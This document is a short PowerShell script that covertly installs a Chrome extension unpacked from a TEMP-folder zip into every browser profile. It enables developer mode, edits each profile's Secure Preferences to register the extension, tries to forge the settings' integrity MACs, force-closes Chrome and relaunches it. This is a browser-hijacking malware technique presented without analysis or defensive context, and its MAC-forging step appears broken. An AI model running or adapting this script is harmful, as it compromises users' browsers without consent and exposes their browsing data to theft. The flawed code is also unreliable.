$ext = "cfmepkojgnkahbmgablgdahdomjdppgf"
$zip = "$env:TEMP\$ext.zip"
powershell -command "Expand-Archive -Path '$zip' -DestinationPath '$env:TEMP\$ext' -Force"
$ud = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$ls = Get-Content "$ud\Local State" -Raw | ConvertFrom-Json
foreach ($p in $ls.profile.info_cache.PSObject.Properties.Name) {
  $f = "$ud\$p\Secure Preferences"
  Copy-Item $f "$f.bak"
  $j = Get-Content $f -Raw | ConvertFrom-Json
  $j.extensions.ui.developer_mode = $true
  $j.extensions.settings | Add-Member -NotePropertyName $ext -NotePropertyValue @{state=1;location=4;path="$env:TEMP\$ext";from_webstore=$false}
  $hmac = New-Object System.Security.Cryptography.HMACSHA256
  # recompute protection.macs and protection.super_mac
  $j.protection.macs.extensions.settings.$ext = [Convert]::ToBase64String($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($ext)))
  $j.protection.super_mac = "0000"
  Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
  $j | ConvertTo-Json -Depth 50 | Set-Content $f
}
Start-Process chrome.exe --restore-last-session
